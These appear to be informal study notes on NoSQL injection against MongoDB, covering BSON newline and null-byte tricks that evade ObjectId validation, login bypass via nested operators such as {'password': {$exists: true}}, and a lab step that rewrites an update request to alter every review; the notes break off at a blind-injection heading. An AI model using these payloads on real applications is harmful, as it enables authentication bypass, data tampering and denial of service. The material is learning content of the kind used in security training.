attacks r not a problem, as the special characters such as ' , : and secmicolon cannot be used to alter the query.

How could a String potentially exploit this BSON object? Screenshot(79)
- Insert a BSON special character/delimeter: 0x00 which is similar idea to the ' within '${username_value}' 
- Insert BSON directly as Nested BSON object
- Insert hex/binary directly
- Insert garbage that isn't BSON and cause a DOS

For mongoDB-> 
\A and \z match the start and end of the string
^ and $ match the start/end of a line as $ matches a /n newline character and in other languages this $ matches the end of
a string

Now in BSON ruby which is inside the mongodb do a simple string validation like this /^[0-9a-f]{24}$/i/ ? true:false, So here
it is determining that if the provided string is a legal object id (hex string), Screenshot(80)

But if we use string like this "a"*24+"\n" now the \n is not a hex hence it will bypass the above validation and got inserted
in mongodb and this caused DoS as the mongoid was not able to talk to mongo

Hence for injection the hacker can input as "aaaaaaa\nb" here 'b' in string could be the arbitary code

If we r expecting a string then we need to white list it and do not want objects to come in.

db.accounts.find({username: username_value, password: password_value}); // here developer is thinking that username and passwords
r correct which r entered
syntx of above cmd ->
db.collection.find(query[[[, fields], options], callback);

{username: username_value, password: password_value} // this much part is query object
- Query object contain logic
- If more than one field is specified, it's an AND query means it is here using 'username and password combination'

In BSON injection -> Validation issues within an underlying library could allow an attacker to inject username_value /
password_value with unexpected characters

Assumeing that underlying libraries r validating correctly, how could one attack now username_value / password_value?
Nested Query Objects

Ex ->
{
	'username': 'admin',
	'password': {$exists: true}
}

$exists is query operator, to subvert the validation condition, an attacker can try to inject query objects that evaluate
to true.

Query Operators ->
- Comparison - Ex: {$gt: 0}
- logical - {$not:''}
- Element - {$exists: true}
- Evaluation - {$where} // it matches documents that satisfy a JavaScript expression
- Comment - db.collection.find({<query>, $comment: <comment>})
XSS log injection

Attack steps ->
- Evaluate client-side code to find API endpoints
- Leverage query object injection to update all reviews

Setup ->
-search for patch for ur statement, patch has all the correct api endpoint information for updating all the reviews on the site
on looking at the code u might conclude that the payload could be like this {'id': X,'messageg': X}
so we need to convert it to {'id':{'$exists': true}, 'message': X}

now find the patch for the url

copy as all in cURL the link 


Blind injection fundamentals ->
